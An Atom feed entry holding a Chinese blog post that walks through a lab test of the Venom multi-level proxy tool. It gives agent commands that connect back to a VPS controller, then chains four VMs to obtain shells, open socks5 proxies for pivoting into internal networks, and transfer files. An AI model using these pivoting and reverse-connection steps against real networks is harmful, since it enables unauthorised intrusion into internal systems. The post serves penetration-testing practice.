    <link href="https://polosec.github.io/2022/01/10/Venom%E2%80%94%E2%80%94%E4%B8%80%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9F%BA%E4%BA%8Ego%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
    <id>https://polosec.github.io/2022/01/10/Venom%E2%80%94%E2%80%94%E4%B8%80%E6%AC%BE%E4%BC%98%E7%A7%80%E7%9A%84%E5%9F%BA%E4%BA%8Ego%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/</id>
    <published>2022-01-10T14:44:36.000Z</published>
    <updated>2022-01-10T14:44:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么选择使用Venom？我认为是方便、快捷、便于理解。</p><h1 id="Venom介绍"><a href="#Venom介绍" class="headerlink" title="Venom介绍"></a>Venom介绍</h1><p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。</p><p>Venom可将多个节点进行连接，然后以节点为跳板，构建多级代理。</p><p>渗透测试人员可以使用Venom轻松地将网络流量代理到多层内网，并轻松地管理代理节点</p><p>项目地址：<a href="https://github.com/Dliv3/Venom">https://github.com/Dliv3/Venom</a></p><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>可视化网络拓扑</li><li>多级socks5代理</li><li>多级端口转发</li><li>端口复用 (apache/mysql/…)</li><li>ssh隧道</li><li>交互式shell</li><li>文件的上传和下载</li><li>节点间通信加密</li><li>支持多种平台(Linux/Windows/MacOS)和多种架构(x86/x64/arm/mips)</li></ul><h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><p><img src="http://cdn.polowong.top/image-20220110214230356.png" alt="image-20220110214230356"></p><h1 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h1><p>./admin -lport 8888</p><p><img src="http://cdn.polowong.top/image-20220110214317062.png" alt="image-20220110214317062"></p><h1 id="VM1"><a href="#VM1" class="headerlink" title="VM1"></a>VM1</h1><p>agent.exe -rhost VPS -rport 8888</p><p><img src="http://cdn.polowong.top/image-20220110214330796.png" alt="image-20220110214330796"></p><p>VPS收到来自VM1的请求</p><p><img src="http://cdn.polowong.top/image-20220110214347646.png" alt="image-20220110214347646"></p><p>可以使用show命令查看节点列表，goto 命令进入节点，shell命令获取一个shell</p><p><img src="http://cdn.polowong.top/image-20220110214446359.png" alt="image-20220110214446359"></p><p>goto某一个节点后，使用socks命令在当前主机打开一个socks5代理，以便后续渗透，访问VPS:port 即可。</p><p><img src="http://cdn.polowong.top/image-20220110214720752.png" alt="image-20220110214720752"></p><p>这样就在VPS:7788开启了一个socks5代理，使用proxifier或者proxychains即可通过代理访问内网其他主机的服务。</p><p>在当前节点使用<strong>listen</strong>命令，在当前主机开启一个端口，等待后续渗透过程中的其他主机连接上线</p><p><img src="http://cdn.polowong.top/image-20220110214807474.png" alt="image-20220110214807474"></p><h1 id="VM2"><a href="#VM2" class="headerlink" title="VM2"></a>VM2</h1><p>中间重启了一下，上述listen 8888端口变成了<strong>7878</strong>，请注意。</p><p>./agent_linux_x64  -rhost 192.168.88.129 -rport 7878</p><p><img src="http://cdn.polowong.top/image-20220110215942251.png" alt="image-20220110215942251"></p><p>在VPS上可以看到VM2已经连进来了</p><p><img src="http://cdn.polowong.top/image-20220110220001252.png" alt="image-20220110220001252"></p><p>执行shell也没问题</p><p><img src="http://cdn.polowong.top/image-20220110220048338.png" alt="image-20220110220048338"></p><p>继续开监听端口</p><p><img src="http://cdn.polowong.top/image-20220110220108805.png" alt="image-20220110220108805"></p><p>这里可以继续添加socks代理访问该主机同网段的其他服务，但是这次试验没添加同网段主机，所以不做演示。</p><h1 id="VM3"><a href="#VM3" class="headerlink" title="VM3"></a>VM3</h1><p><img src="http://cdn.polowong.top/image-20220110220259266.png" alt="image-20220110220259266"></p><p><img src="http://cdn.polowong.top/image-20220110220307162.png" alt="image-20220110220307162"></p><p>看一下能不能执行命令（有360）</p><p><img src="http://cdn.polowong.top/image-20220110220459516.png" alt="image-20220110220459516"></p><p>没问题，listen一下，等待后续机器连接</p><p><img src="http://cdn.polowong.top/image-20220110221446402.png" alt="image-20220110221446402"></p><h1 id="VM4"><a href="#VM4" class="headerlink" title="VM4"></a>VM4</h1><p><img src="http://cdn.polowong.top/image-20220110223740859.png" alt="image-20220110223740859"></p><p>VM4连接VM3调了挺久，防火墙也关了，策略也都做好了，死活ping不通，过一会就好了- -</p><p><img src="http://cdn.polowong.top/image-20220110223902831.png" alt="image-20220110223902831"></p><p>这样所有的主机都拿到了权限并且可以开启socks代理打内网机器、上传下载文件。</p><h1 id="不出网上线CS"><a href="#不出网上线CS" class="headerlink" title="不出网上线CS"></a>不出网上线CS</h1><p>参考<a href="https://www.cy3ng.com/2021/07/29/1/%EF%BC%8C%E5%BE%85%E5%AE%8C%E6%88%90">https://www.cy3ng.com/2021/07/29/1/，待完成</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;为什么选择使用Venom？我认为是方便、快捷、便于理解。&lt;/p&gt;
&lt;h1 id=&quot;Venom介绍&quot;&gt;&lt;a href=&quot;#Venom介绍&quot; c</summary>
      
    
    
    
    
  </entry>
  
</feed>
